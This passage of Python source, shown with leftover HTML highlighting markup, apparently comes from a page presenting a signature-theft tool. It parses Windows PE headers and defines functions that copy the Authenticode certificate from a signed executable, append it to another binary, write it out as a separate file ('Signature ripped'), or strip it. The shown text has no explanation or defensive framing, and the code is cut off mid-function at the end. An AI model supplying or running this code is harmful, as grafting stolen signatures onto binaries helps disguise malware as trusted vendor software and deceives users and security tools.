        <span class="token keyword">if</span> flItms<span class="token punctuation">[</span><span class="token string">'Magic'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x20B</span><span class="token punctuation">:</span>
            flItms<span class="token punctuation">[</span><span class="token string">'ImageBase'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            flItms<span class="token punctuation">[</span><span class="token string">'ImageBase'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'SectionAlignment'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'FileAlignment'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'MajorOperatingSystemVersion'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;H'</span><span class="token punctuation">,</span>
                                                                   binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'MinorOperatingSystemVersion'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;H'</span><span class="token punctuation">,</span>
                                                                   binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'MajorImageVersion'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;H'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'MinorImageVersion'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;H'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'MajorSubsystemVersion'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;H'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'MinorSubsystemVersion'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;H'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'Win32VersionValue'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'SizeOfImageLoc'</span><span class="token punctuation">]</span> <span class="token operator">=</span> binary<span class="token punctuation">.</span><span class="token function">tell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        flItms<span class="token punctuation">[</span><span class="token string">'SizeOfImage'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'SizeOfHeaders'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'CheckSum'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'Subsystem'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;H'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'DllCharacteristics'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;H'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> flItms<span class="token punctuation">[</span><span class="token string">'Magic'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x20B</span><span class="token punctuation">:</span>
            flItms<span class="token punctuation">[</span><span class="token string">'SizeOfStackReserve'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            flItms<span class="token punctuation">[</span><span class="token string">'SizeOfStackCommit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            flItms<span class="token punctuation">[</span><span class="token string">'SizeOfHeapReserve'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            flItms<span class="token punctuation">[</span><span class="token string">'SizeOfHeapCommit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

        <span class="token keyword">else</span><span class="token punctuation">:</span>
            flItms<span class="token punctuation">[</span><span class="token string">'SizeOfStackReserve'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            flItms<span class="token punctuation">[</span><span class="token string">'SizeOfStackCommit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            flItms<span class="token punctuation">[</span><span class="token string">'SizeOfHeapReserve'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            flItms<span class="token punctuation">[</span><span class="token string">'SizeOfHeapCommit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'LoaderFlags'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  # zero
        flItms<span class="token punctuation">[</span><span class="token string">'NumberofRvaAndSizes'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token macro property"># End Windows-Specific Fields of Optional Header</span>
        <span class="token macro property"># Begin Data Directories of Optional Header</span>
        flItms<span class="token punctuation">[</span><span class="token string">'ExportTableRVA'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'ExportTableSize'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'ImportTableLOCInPEOptHdrs'</span><span class="token punctuation">]</span> <span class="token operator">=</span> binary<span class="token punctuation">.</span><span class="token function">tell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token macro property">#ImportTable SIZE|LOC</span>
        flItms<span class="token punctuation">[</span><span class="token string">'ImportTableRVA'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'ImportTableSize'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'ResourceTable'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'ExceptionTable'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'CertTableLOC'</span><span class="token punctuation">]</span> <span class="token operator">=</span> binary<span class="token punctuation">.</span><span class="token function">tell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        flItms<span class="token punctuation">[</span><span class="token string">'CertLOC'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"&lt;I"</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'CertSize'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"&lt;I"</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        binary<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> flItms


def <span class="token function">copyCert</span><span class="token punctuation">(</span>exe<span class="token punctuation">)</span><span class="token punctuation">:</span>
    flItms <span class="token operator">=</span> <span class="token function">gather_file_info_win</span><span class="token punctuation">(</span>exe<span class="token punctuation">)</span>

    <span class="token keyword">if</span> flItms<span class="token punctuation">[</span><span class="token string">'CertLOC'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> or flItms<span class="token punctuation">[</span><span class="token string">'CertSize'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token macro property"># not signed</span>
        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Input file Not signed!"</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>

    with <span class="token function">open</span><span class="token punctuation">(</span>exe<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> as f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span><span class="token function">seek</span><span class="token punctuation">(</span>flItms<span class="token punctuation">[</span><span class="token string">'CertLOC'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
        cert <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>flItms<span class="token punctuation">[</span><span class="token string">'CertSize'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cert


def <span class="token function">writeCert</span><span class="token punctuation">(</span>cert<span class="token punctuation">,</span> exe<span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">:</span>
    flItms <span class="token operator">=</span> <span class="token function">gather_file_info_win</span><span class="token punctuation">(</span>exe<span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> not output<span class="token punctuation">:</span> 
        output <span class="token operator">=</span> output <span class="token operator">=</span> <span class="token function">str</span><span class="token punctuation">(</span>exe<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"_signed"</span>

    shutil<span class="token punctuation">.</span><span class="token function">copy2</span><span class="token punctuation">(</span>exe<span class="token punctuation">,</span> output<span class="token punctuation">)</span>
    
    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Output file: {0}"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span>

    with <span class="token function">open</span><span class="token punctuation">(</span>exe<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> as g<span class="token punctuation">:</span>
        with <span class="token function">open</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> as f<span class="token punctuation">:</span>
            f<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            f<span class="token punctuation">.</span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
            f<span class="token punctuation">.</span><span class="token function">seek</span><span class="token punctuation">(</span>flItms<span class="token punctuation">[</span><span class="token string">'CertTableLOC'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
            f<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">"&lt;I"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span><span class="token function">open</span><span class="token punctuation">(</span>exe<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            f<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">"&lt;I"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>cert<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            f<span class="token punctuation">.</span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> io<span class="token punctuation">.</span><span class="token constant">SEEK_END</span><span class="token punctuation">)</span>
            f<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>cert<span class="token punctuation">)</span>

    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Signature appended. \nFIN."</span><span class="token punctuation">)</span>


def <span class="token function">outputCert</span><span class="token punctuation">(</span>exe<span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cert <span class="token operator">=</span> <span class="token function">copyCert</span><span class="token punctuation">(</span>exe<span class="token punctuation">)</span>
    <span class="token keyword">if</span> not output<span class="token punctuation">:</span>
        output <span class="token operator">=</span> <span class="token function">str</span><span class="token punctuation">(</span>exe<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"_sig"</span>

    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Output file: {0}"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token function">open</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>cert<span class="token punctuation">)</span>

    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Signature ripped. \nFIN."</span><span class="token punctuation">)</span>


def <span class="token function">check_sig</span><span class="token punctuation">(</span>exe<span class="token punctuation">)</span><span class="token punctuation">:</span>
    flItms <span class="token operator">=</span> <span class="token function">gather_file_info_win</span><span class="token punctuation">(</span>exe<span class="token punctuation">)</span>
 
    <span class="token keyword">if</span> flItms<span class="token punctuation">[</span><span class="token string">'CertLOC'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> or flItms<span class="token punctuation">[</span><span class="token string">'CertSize'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token macro property"># not signed</span>
        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Inputfile Not signed!"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Inputfile is signed!"</span><span class="token punctuation">)</span>


def <span class="token function">truncate</span><span class="token punctuation">(</span>exe<span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">:</span>
    flItms <span class="token operator">=</span> <span class="token function">gather_file_info_win</span><span class="token punctuation">(</span>exe<span class="token punctuation">)</span>
 
    <span class="token keyword">if</span> flItms<span class="token punctuation">[</span><span class="token string">'CertLOC'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> or flItms<span class="token punctuation">[</span><span class="token string">'CertSize'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token macro property"># not signed</span>
        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Inputfile Not signed!"</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token function">print</span><span class="token punctuation">(</span> <span class="token string">"Inputfile is signed!"</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> not output<span class="token punctuation">:</span>
        output <span class="token operator">=</span> <span class="token function">str</span><span class="token punctuation">(</span>exe<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"_nosig"</span>

    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Output file: {0}"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span>

    shutil<span class="token punctuation">.</span><span class="token function">copy2</span><span class="token punctuation">(</span>exe<span class="token punctuation">,</span> output<span class="token punctuation">)</span>

    with <span class="token function">open</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> <span class="token string">"r+b"</span><span class="token punctuation">)</span> as binary<span class="token punctuation">:</span>
        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'Overwriting certificate table pointer and truncating binary'</span><span class="token punctuation">)</span>
        binary<span class="token punctuation">.</span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token operator">-</span>flItms<span class="token punctuation">[</span><span class="token string">'CertSize'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> io<span class="token punctuation">.</span><span class="token constant">SEEK_END</span><span class="token punctuation">)</span>
        binary<span class="token punctuation">.</span><span class="token function">truncate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        binary<span class="token punctuation">.</span><span class="token function">seek</span><span class="token punctuation">(</span>flItms<span class="token punctuation">[</span><span class="token string">'CertTableLOC'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
        binary<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>b<span class="token string">"\x00\x00\x00\x00\x00\x00\x00\x00"</span><span class="token punctuation">)</span>

    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Signature removed. \nFIN."</span><span class="token punctuation">)</span>


def <span class="token function">signfile</span><span class="token punctuation">(</span>exe<span class="token punctuation">,</span> sigfile<span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">:</span>
    flItms <span class="token operator">=</span> <span class="token function">gather_file_info_win</span><span class="token punctuation">(</span>exe<span class="token punctuation">)</span>
    
    cert <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>sigfile<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> not output<span class="token punctuation">:</span> 
        output <span class="token operator">=</span> output <span class="token operator">=</span> <span class="token function">str</span><span class="token punctuation">(</span>exe<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"_signed"</span>

    shutil<span class="token punctuation">.</span><span class="token function">copy2</span><span class="token punctuation">(</span>exe<span class="token punctuation">,</span> output<span class="token punctuation">)</span>
    
    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Output file: {0}"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
